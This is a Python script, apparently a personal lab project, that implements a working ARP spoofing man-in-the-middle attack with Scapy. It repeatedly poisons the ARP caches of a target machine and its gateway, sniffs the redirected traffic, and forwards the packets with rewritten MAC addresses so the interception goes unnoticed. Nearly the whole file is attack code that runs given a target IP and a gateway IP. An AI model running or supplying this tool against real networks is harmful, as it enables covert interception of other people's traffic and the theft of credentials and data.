#https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/
#https://www.geeksforgeeks.org/how-address-resolution-protocol-arp-works/
#https://en.wikipedia.org/wiki/Address_Resolution_Protocol
#https://stackoverflow.com/questions/50703738/what-is-the-meaning-of-the-scapy-arp-attributes

import scapy.all as scapy
import time, sys, threading


def get_mac(ip): #Send out ARP request from "ff:ff:ff:ff:ff:ff" asking what the MAC address of the specified IP is. Return ARP reply
    arp_request = scapy.ARP(pdst = ip) #pdst = where your arp request is going to go.
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff") #dst = broadcast mac address
    arp_request_broadcast = broadcast / arp_request #Combines ARP request and made up mac address 
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0] #Actually send it and store results in list
    #print("Answered List: " + answered_list)
    return answered_list[0][1].hwsrc #hwsrc = Sender Hardware Address (SHA) what MAC address replied.

def spoof(target_ip, spoof_ip): #Send an ARP reply to target ip address saying that we are the spoof ip
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip) #Already knows what our (kira's) MAC address is so it will use that as the hwsrc
    #pdst is Target Protocal Address (TPA) who we sending to
    #hwdst = Target hardware address (THA) destination hardware address
    #psrc = Sender protocol address (SPA) The ip address of the device sending the message
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip) #Get MAC of computer at destination ip
    source_mac = get_mac(source_ip) #Get MAC of computer at source ip
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)

def PacketRedirect():
    scapy.sniff(iface=interface, prn=process_packet, filter="(ether dst " + host_mac + ") and (dst not " + host_ip + ")")

def process_packet(packet):
    #print("start: " + str(round(time.time()*1000)))
    if packet[0][0].type != 2054: #2054 is ARP's type number
        if packet[0][1].src == target_ip: #if incoming packet came from Mykola
            #print("Length before modification: " + str(packet[0][1].len))
            packet[0][0].dst = gateway_mac #Change packet MAC destination to actual gateway's MAC address
            packet[0][0].src = host_mac #Change source mac address so when it is returned to us, as the gateway will return the packet to sender, we want it to send it to us not mykola
            if packet[0][1].len > 1500:
                frags=scapy.fragment(packet,fragsize=1480)
                for fragment in frags:
                    #scapy.sendp(fragment, iface="enp0s10",verbose=0)
                    scapy.sendp(fragment, socket=s, verbose=False)
                    #print("end: " + str(round(time.time()*1000)))
            else:
                #print("Length after modification: " + str(packet[0][1].len))
                #packet.show()
                #print("send packet from mykola to gateway")
                #scapy.sendp(packet, iface="enp0s10",verbose=0)
                scapy.sendp(packet, socket=s, verbose=False)
                #print("end: " + str(round(time.time()*1000)))
        else:
        #if packet[0][1].dst == target_ip: #if incoming packet is addressed to Mykola and MAC address is to Kira
            #print("Length before modification: " + str(packet[0][1].len))
            packet[0][0].dst = target_mac #Change packet MAC destination to Mykolas actual MAC address
            packet[0][0].src = host_mac
            if packet[0][1].len > 1500:
                #print("fragmenting...")
                frags=scapy.fragment(packet,fragsize=1480)
                for fragment in frags:
                    #scapy.sendp(fragment, iface="enp0s10",verbose=0)
                    scapy.sendp(fragment, socket=s, verbose=False)
                    #print("end: " + str(round(time.time()*1000)))
            else:
                #print("Length after modification: " + str(packet[0][1].len))
                #packet.show()
                #print("send packet from gateway to mykola")
                #scapy.sendp(packet, iface="enp0s10",verbose=0)
                scapy.sendp(packet, socket=s, verbose=False)
                #print("end: " + str(round(time.time()*1000)))

#def ThreadManager(packet):
#    #print(packet)
#    ThreadedPackets = threading.Thread(target=process_packet, args=(packet,), daemon=True)
#    ThreadedPackets.start()


interface = "enp0s10"
host_ip = scapy.get_if_addr(interface)
host_mac = scapy.get_if_hwaddr(interface)
target_ip = sys.argv[1]
target_mac = get_mac(target_ip) #AC
gateway_ip = sys.argv[2] 
gateway_mac = get_mac(gateway_ip) #AB

sent_packets_count = 0
Redirect = threading.Thread(target=PacketRedirect, args=(), daemon=True)
try:
    print("Redirect Thread starting...")
    try:
        s = scapy.conf.L2socket(iface=interface) #open socket so scapy doesn't open and close it every time it sends something
        Redirect.start() #Start packet redirect
    except Exception as Error:
        print("Redirect Thread failed to start: " + str(Error))
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip) #Tell target ip that we are the gateway
        spoof(gateway_ip, target_ip) #Tell the gateway that we are the Target ip
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
        time.sleep(2) # Waits for two seconds
except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    s.close() #Close scapy's socket
    restore(gateway_ip, target_ip) #Correct the gateway's idea of who target ip is
    restore(target_ip, gateway_ip) #Correct the target ip's idea of who the gateway is
    print("[+] Arp Spoof Stopped")
